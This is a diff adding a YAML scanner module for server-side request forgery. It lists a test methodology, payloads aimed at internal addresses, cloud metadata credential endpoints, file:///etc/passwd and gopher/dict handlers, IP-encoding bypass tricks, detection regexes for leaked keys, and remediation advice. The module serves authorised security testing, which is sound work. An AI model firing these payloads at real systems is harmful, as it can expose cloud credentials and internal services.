@@ -1,0 +1,85 @@
+name: Server-Side Request Forgery
+category: web
+description: >
+  Detects SSRF vulnerabilities where the server makes requests to
+  attacker-controlled URLs. Tests for internal network access,
+  cloud metadata exfiltration, and protocol smuggling.
+
+severity_range: ["MEDIUM", "HIGH", "CRITICAL"]
+tools: ["custom_payloads", "curl", "ffuf"]
+
+methodology:
+  - "Identify URL-fetching functionality (image loaders, webhooks, imports, PDF generators)"
+  - "Test with external callback URL to confirm server-side request"
+  - "Test internal IPs: 127.0.0.1, 10.x.x.x, 172.16.x.x, 192.168.x.x"
+  - "Test cloud metadata endpoints: 169.254.169.254 (AWS/GCP/Azure)"
+  - "Test protocol handlers: file://, gopher://, dict://, ftp://"
+  - "Test URL parsing bypasses: @, #, redirect, DNS rebinding"
+  - "Test for open redirect chains to reach internal services"
+  - "Check response content for internal data leakage"
+  - "Test IPv6 variants: [::1], [::ffff:127.0.0.1]"
+  - "Test DNS-based bypass: nip.io, sslip.io"
+
+payloads:
+  # Internal network
+  - "http://127.0.0.1/"
+  - "http://localhost/"
+  - "http://0.0.0.0/"
+  - "http://10.0.0.1/"
+  - "http://172.16.0.1/"
+  - "http://192.168.1.1/"
+  # Cloud metadata
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+  - "http://metadata.google.internal/computeMetadata/v1/"
+  - "http://169.254.169.254/metadata/instance"
+  # Protocol handlers
+  - "file:///etc/passwd"
+  - "file:///c:/windows/system32/drivers/etc/hosts"
+  - "gopher://127.0.0.1:25/"
+  - "dict://127.0.0.1:6379/"
+  - "ftp://127.0.0.1/"
+  # Bypass techniques
+  - "http://127.1/"
+  - "http://0177.0.0.1/"
+  - "http://0x7f.0x0.0x0.0x1/"
+  - "http://[::1]/"
+  - "http://127.0.0.1.nip.io/"
+  - "http://localtest.me/"
+  - "http://0.0.0.0:80/"
+  - "http://127.0.0.1:22/"
+  - "http://127.0.0.1:3306/"
+  - "http://127.0.0.1:6379/"
+  - "http://127.0.0.1:9200/"
+
+detection_patterns:
+  - "root:.*:0:0:"
+  - "\\[boot loader\\]"
+  - "(?:ami-[a-f0-9]{8,17}|instance-id|i-[a-f0-9]{8,17})"
+  - "(?:AccessKey|SecretKey|Token).*?[A-Za-z0-9/+=]{20,}"
+  - "(?:INTERNAL_IP|PRIVATE_IP|metadata)"
+  - "SSH-2\\.0-"
+
+remediation: >
+  Validate and whitelist allowed URLs/domains. Use an allowlist approach
+  for URL fetching. Block requests to internal/private IP ranges.
+  Disable unnecessary URL schemes. Use a dedicated egress proxy.
+  Implement network segmentation. Use cloud metadata v2 (IMDSv2) with tokens.
+
+references:
+  - "CWE-918: Server-Side Request Forgery"
+  - "OWASP SSRF Prevention Cheat Sheet"
+  - "PortSwigger SSRF"
+
+triggers:
+  - "ssrf"
+  - "url"
+  - "fetch"
+  - "webhook"
+  - "redirect"
+  - "import"
+  - "image"
+  - "pdf"
+  - "proxy"
+  - "download"
+  - "callback"
